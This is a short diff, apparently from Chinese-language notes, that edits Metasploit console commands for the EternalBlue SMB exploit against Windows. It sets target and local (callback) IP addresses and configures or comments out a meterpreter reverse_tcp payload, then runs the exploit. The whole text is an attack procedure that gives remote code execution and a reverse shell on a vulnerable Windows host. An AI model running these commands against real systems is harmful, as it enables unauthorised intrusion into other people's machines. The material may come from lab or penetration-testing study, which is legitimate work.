@@ -9,4 +9,5 @@ run
 use exploit/windows/smb/ms17_010_eternalblue
  set RHOST 192.168.1.227
  set LHOST 192.168.5.118    本机
-set payload windows/x64/meterpreter/reverse_tcp     //配置回链方式
+//set payload windows/x64/meterpreter/reverse_tcp     //配置回链方式
+run 或者 exploit
